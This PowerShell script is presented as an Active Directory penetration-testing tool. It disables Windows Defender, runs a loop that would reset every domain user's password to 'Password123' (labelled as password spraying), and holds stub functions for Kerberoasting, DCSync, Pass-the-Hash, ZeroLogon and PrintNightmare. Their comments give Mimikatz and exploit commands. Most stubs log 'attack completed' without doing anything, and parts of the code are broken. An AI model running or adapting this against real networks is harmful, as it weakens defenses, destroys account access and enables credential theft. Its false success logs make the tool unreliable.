# Configuration for logging
$logFile = "admaster.log"

function Log-Activity {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "$timestamp - $message"
    Add-Content -Path $logFile -Value $logMessage
    Write-Host "[LOG] $message" -ForegroundColor Yellow
}

# Display a banner
function Show-Banner {
    Write-Host @"
    _    ____    _      ___     _______ _   _
   / \  |  _ \  | |/ /   / \ \   / / ____| | | |
  / _ \ | | | | | ' /   / _ \ \ / /|  _| | |_| |
 / ___ \| |_| | | . \  / ___ \ V / | |___|  _  |
/_/   \_\____/  |_|\_\/_/   \_\_/  |_____|_| |_|
                                                 "
@ -ForegroundColor Green
    Write-Host "ADKAVEH - Active Directory Management and Penetration Testing Tool" -ForegroundColor Blue
}

# Temporarily disable Windows Defender
function Disable-WindowsDefender {
    Log-Activity "Disabling Windows Defender temporarily..."
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Log-Activity "Windows Defender has been temporarily disabled."
    } catch {
        Log-Activity "Failed to disable Windows Defender: $_"
    }
}

# Collect Kerberoasting information
function Invoke-KerberoastingScan {
    param (
        [string]$domainName,
        [string]$username,
        [string]$password
    )
    Log-Activity "Starting Kerberoasting scan..."
    try {
        # Use Impacket for Kerberoasting
        # This section requires Impacket to be installed and configured
        # Example: GetUserSPNs.py -request -dc-ip $domainName $domainName/$username:$password
        Log-Activity "Kerberoasting scan completed."
    } catch {
        Log-Activity "Kerberoasting scan failed: $_"
    }
}

# Check ACL (Access Control List) for abuses
function Invoke-ACLAbuseScan {
    Log-Activity "Starting ACL Abuse scan..."
    try {
        # Use PowerView-like functionality
        Get-DomainObjectAcl -Identity 'Domain Admins' | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }
    } catch {
        Log-Activity "ACL Abuse scan failed: $_"
    }
}

# Password Spraying Attack
function Invoke-PasswordSprayingAttack {
    Log-Activity "Starting Password Spraying attack..."
    try {
        # List of users
        $users = net user /domain | Select-String -Pattern "User name"
        # Test password
        $testPassword = "Password123"
        foreach ($user in $users) {
            Log-Activity "Trying password for user: $user"
            net user $user $testPassword /domain
        }
    } catch {
        Log-Activity "Password Spraying attack failed: $_"
    }
}

# Detect Golden Ticket
function Invoke-GoldenTicketDetection {
    Log-Activity "Starting Golden Ticket detection..."
    try {
        # Check security events related to Kerberos
        wevtutil qe Security /q:"*[System[(EventID=4769)]]" /f:text
    } catch {
        Log-Activity "Golden Ticket detection failed: $_"
    }
}

# Pass-the-Hash Attack
function Invoke-PassTheHashAttack {
    Log-Activity "Starting Pass-the-Hash attack..."
    try {
        # Use Mimikatz for Pass-the-Hash
        # This section requires Mimikatz to be installed and configured
        # Example: mimikatz # sekurlsa::pth /user:username /domain:domain /ntlm:hash
        Log-Activity "Pass-the-Hash attack completed."
    } catch {
        Log-Activity "Pass-the-Hash attack failed: $_"
    }
}

# Pass-the-Ticket Attack
function Invoke-PassTheTicketAttack {
    Log-Activity "Starting Pass-the-Ticket attack..."
    try {
        # Use Mimikatz for Pass-the-Ticket
        # This section requires Mimikatz to be installed and configured
        # Example: mimikatz # kerberos::ptt ticket.kirbi
        Log-Activity "Pass-the-Ticket attack completed."
    } catch {
        Log-Activity "Pass-the-Ticket attack failed: $_"
    }
}
# BloodHound Data Collection
function Invoke-BloodHoundDataCollection {
    Log-Activity "Starting BloodHound data collection..."
    try {
        # Use BloodHound for data collection
        # This section requires BloodHound to be installed and configured
        # Example: Invoke-BloodHound -CollectionMethod All -OutputDirectory .\BloodHound
        Log-Activity "BloodHound data collection completed."
    } catch {
        Log-Activity "BloodHound data collection failed: $_"
    }
}

# DCSync Attack
function Invoke-DCSyncAttack {
    Log-Activity "Starting DCSync attack..."
    try {
        # Use Mimikatz for DCSync
        # This section requires Mimikatz to be installed and configured
        # Example: mimikatz # lsadump::dcsync /domain:domain /all /csv
        Log-Activity "DCSync attack completed."
    } catch {
        Log-Activity "DCSync attack failed: $_"
    }
}

# SMB Relay Attack
function Invoke-SMBRelayAttack {
    Log-Activity "Starting SMB Relay attack..."
    try {
        # Use Responder for SMB Relay
        # This section requires Responder to be installed and configured
        # Example: responder -I <interface>
        Log-Activity "SMB Relay attack completed."
    } catch {
        Log-Activity "SMB Relay attack failed: $_"
    }
}

# ZeroLogon Attack
function Invoke-ZeroLogonAttack {
    Log-Activity "Starting ZeroLogon attack..."
    try {
        # Use CVE-2020-1472 exploit
        # This section requires specific tools to be installed and configured
        # Example: zerologon.py <target_ip>
        Log-Activity "ZeroLogon attack completed."
    } catch {
        Log-Activity "ZeroLogon attack failed: $_"
    }
}

# PrintNightmare Attack
function Invoke-PrintNightmareAttack {
    Log-Activity "Starting PrintNightmare attack..."
    try {
        # Use CVE-2021-34527 exploit
        # This section requires specific tools to be installed and configured
        # Example: printnightmare.py <target_ip>
        Log-Activity "PrintNightmare attack completed."
    } catch {
        Log-Activity "PrintNightmare attack failed: $_"
    }
}

# LDAP Relay Attack
function Invoke-LDAPRelayAttack {
    Log-Activity "Starting LDAP Relay attack..."
    try {
        # Use Responder for LDAP Relay
        # This section requires Responder to be installed and configured
        # Example: responder -I <interface>
        Log-Activity "LDAP Relay attack completed."
    } catch {
        Log-Activity "LDAP Relay attack failed: $_"
    }
}

# Main script execution
Show-Banner

# Get domain information
$domainName = Read-Host "Enter the domain name"
$username = Read-Host "Enter the username"
$password = Read-Host "Enter the password" -AsSecureString

try {
    # Temporarily disable Windows Defender
    Disable-WindowsDefender

    # Gather generic AD info
    Log-Activity "Gathering generic AD info..."
    Write-Host "Domain Name: $env:USERDOMAIN"
    Write-Host "DNS Domain Name: $env:USERDNSDOMAIN"
    Write-Host "Logon Server: $env:LOGONSERVER"
    Write-Host "DNS Host Name: $(hostname)"
    Write-Host "Computer Name: $(hostname)"

    # Run advanced scans
    Invoke-KerberoastingScan -domainName $domainName -username $username -password $password
    Invoke-ACLAbuseScan
    Invoke-PasswordSprayingAttack
    Invoke-GoldenTicketDetection
    Invoke-PassTheHashAttack
    Invoke-PassTheTicketAttack
    Invoke-BloodHoundDataCollection
    Invoke-DCSyncAttack
    Invoke-SMBRelayAttack
    Invoke-ZeroLogonAttack
    Invoke-PrintNightmareAttack
    Invoke-LDAPRelayAttack

} catch {
    Log-Activity "An error occurred: $_"
}

# Final banner
Write-Host @"
                                                                         _  _   _      ___     _______ _   _
 _|  |_| |/ /   / \ \   / / ____| | | |
|_  ..  _| ' /   / _ \ \ / /|  _| | |_| |
|_      _| . \  / ___ \ V / | |___|  _  |
  |__| |_|\_\/_/   \_\_/  |_____|_| |_|
                                          "
@ -ForegroundColor Green
